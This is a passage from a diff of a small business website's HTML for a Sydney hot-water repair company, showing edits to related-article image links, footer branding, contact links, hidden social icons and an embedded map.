                             <a href="how-often-should-i-replace-my-anode-rod-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should I replace my anode rod?
@@ -680,7 +682,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-does-it-take-to-flush-a-water-heater-326930.jpg?key=6RgOxA" alt="How long does it take to flush a water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-does-it-take-to-flush-a-water-heater-326930.jpg?key=JnqowU" alt="How long does it take to flush a water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-does-it-take-to-flush-a-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long does it take to flush a water heater?
@@ -692,7 +694,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/does-a-hot-water-tank-need-cleaning-326932.jpg?key=x0NSLr" alt="Does a hot water tank need cleaning?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/does-a-hot-water-tank-need-cleaning-326932.jpg?key=QvDK7d" alt="Does a hot water tank need cleaning?" class="rounded"
                                  width="80" height="80">
                             <a href="does-a-hot-water-tank-need-cleaning.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Does a hot water tank need cleaning?
@@ -724,14 +726,16 @@
             <div class="row g-lg-3">
                 <div class="col-12 col-lg-7 col-xl-7">
                     <div class="vstack gap-5">
-                        <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
-                            <!-- Brand Logo/Mark -->
-                            <img fetchpriority="low" async="true" defer="true"
-                                 display: none " src="logo.png" onerror="this.remove()"
-                            height="100" />
-                            <!-- Brand Name -->
-                            <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
-                        </a>
+                        <div class="d-inline-flex gap-2 align-items-center">
+                            <a class="navbar-brand m-0 gap-2 align-items-center" href="index.html">
+                                <!-- Brand Logo/Mark -->
+                                <img alt="Hot Water Experts Sydney" fetchpriority="low" async="true" defer="true"
+                                     style="display: inherit" src="logo.png" onerror="this.remove()"
+                                     height="100" />
+                                <!-- Brand Name -->
+                                <p class="fs-5 fw-medium">Hot Water Experts Sydney</p>
+                            </a>
+                        </div>
 
                         <div style="display: ">
                             <strong>Address:</strong>
@@ -741,14 +745,14 @@
                         <div style="display: ">
                             <strong>Contact:</strong>
                             <p class="mb-0">
-                                <a href="tel:+18001234567">0490 414 794</a>
+                                <a href="tel:0490 414 794" title="Contact Number">0490 414 794</a>
                                 <br>
-                                <a style="display: " href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
+                                <a style="display: " title="Email Address" href="mailto:info@hotwaterexpertssydney.com.au">info@hotwaterexpertssydney.com.au</a>
                             </p>
                         </div>
 
                         <div class="d-inline-flex gap-4" style="display: none">
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href=""  title="Facebook Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-facebook" viewBox="0 0 16 16">
                                     <path
@@ -756,14 +760,14 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Instagram Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-instagram" viewBox="0 0 16 16">
                                     <path
                                             d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.9 3.9 0 0 0-1.417.923A3.9 3.9 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.9 3.9 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.9 3.9 0 0 0-.923-1.417A3.9 3.9 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599s.453.546.598.92c.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.5 2.5 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.5 2.5 0 0 1-.92-.598 2.5 2.5 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233s.008-2.388.046-3.231c.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92s.546-.453.92-.598c.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92m-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217m0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334" />
                                 </svg>
                             </a>
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Twitter Link" title="Twitter Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-twitter-x" viewBox="0 0 16 16">
                                     <path
@@ -771,7 +775,7 @@
                                 </svg>
                             </a>
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Pinterest Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor"
                                      class="bi bi-pinterest-x" viewBox="0 0 496 512">
                                     <path d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3 .8-3.4 5-20.3 6.9-28.1 .6-2.5 .3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/>
@@ -780,7 +784,7 @@
                             </a>
 
 
-                            <a href="" class="text-decoration-none" style="display: none" target="_blank">
+                            <a href="" title="Youtube Link" class="text-decoration-none" style="display: none" target="_blank">
                                 <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor"
                                      class="bi bi-youtube" viewBox="0 0 16 16">
                                     <path
@@ -795,9 +799,8 @@
                     <div class="row">
                         <div class="col-12 col-lg-12 align-self-center">
                             <div class="card h-50 border-0 p-0 bg-section-light" style="display: ">
-                                <iframe
-                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
-                                        class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
+                                <iframe title="Locate Us"
+                                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau" class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                                         referrerpolicy="no-referrer-when-downgrade"></iframe>
                             </div>
                         </div>
@@ -812,7 +815,6 @@
                 <a href="privacy.html" class="text-start" style="display: inherit">Privacy Policy</a>
                 <a href="terms.html" class="text-center mx-md-4" style="display: inherit">Terms of Service</a>
                 <a href="sitemap.html" class="text-center mx-md-4" style="display: inherit">Sitemap</a>
-
             </div>
         </div>
     </div>
